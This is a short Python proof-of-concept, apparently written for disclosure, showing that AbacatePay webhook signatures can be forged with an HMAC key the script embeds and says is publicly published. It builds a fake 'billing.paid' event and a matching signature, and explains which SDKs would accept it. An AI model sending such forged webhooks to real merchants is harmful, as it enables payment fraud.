#!/usr/bin/env python3
"""
PoC LOCAL — forja de assinatura de webhook AbacatePay.
NAO faz NENHUMA requisicao ao servidor da AbacatePay. E puro calculo HMAC local,
usando a chave que a propria AbacatePay publica no codigo aberto (5+ SDKs) e na doc.
Prova: com a chave publica, qualquer um gera X-Webhook-Signature valida.
"""
import hmac, hashlib, base64, json

# Chave extraida de: abacatepay-elixir-sdk, abacatepay-cli, ecosystem, go-types,
# abacatepay-ruby-sdk  E  documentada em docs.abacatepay.com/pages/webhooks/security
PUBLIC_KEY = ("t9dXRhHHo3yDEj5pVDYz0frf7q6bMKyMRmxxCPIPp3RCplBfXRxqlC6ZpiWmOqj4L63qEaeUO"
              "trCI8P0VMUgo6iIga2ri9ogaHFs0WIIywSMg0q7RmBfybe1E5XJcfC4IW3alNqym0tXoAKkz"
              "vfEjZxV6bE0oG2zJrNNYmUCKZyV0KZ3JS8Votf9EAWWYdiDkMkpbMdPggfh1EqHlVkMiTady"
              "6jOR3hyzGEHrIz2Ret0xHKMbiqkr9HS1JhNHDX9")

# Payload de um webhook FORJADO de "pagamento confirmado"
forged = {
    "event": "billing.paid",
    "id": "webhook_forjado_por_atacante",
    "data": {"id": "bill_FAKE", "status": "PAID", "amount": 99900}
}
raw = json.dumps(forged, separators=(",", ":")).encode()

# Assinatura que o atacante coloca no header X-Webhook-Signature.
# Implementacao identica a do proprio SDK Elixir/Node deles.
sig = base64.b64encode(hmac.new(PUBLIC_KEY.encode(), raw, hashlib.sha256).digest()).decode()

print("=== PoC: forja de webhook AbacatePay (calculo 100% local) ===")
print("Body forjado :", raw.decode())
print("X-Webhook-Signature forjada:", sig)
print()
# Agora provamos que o verify_signature do SDK Elixir/ecosystem ACEITARIA isso:
expected = base64.b64encode(hmac.new(PUBLIC_KEY.encode(), raw, hashlib.sha256).digest()).decode()
print("verify_signature(payload, sig) do SDK retornaria:", hmac.compare_digest(sig, expected))
print()
print(">>> Conclusao: um SDK que valida SO a assinatura HMAC (Elixir, ecosystem/")
print(">>> adapters) aceita este evento forjado como autentico. O merchant credita")
print(">>> um pagamento de R$999,00 que NUNCA aconteceu.")
print(">>> A protecao real e o webhookSecret per-merchant na query — que esses")
print(">>> dois SDKs oficiais NAO verificam.")
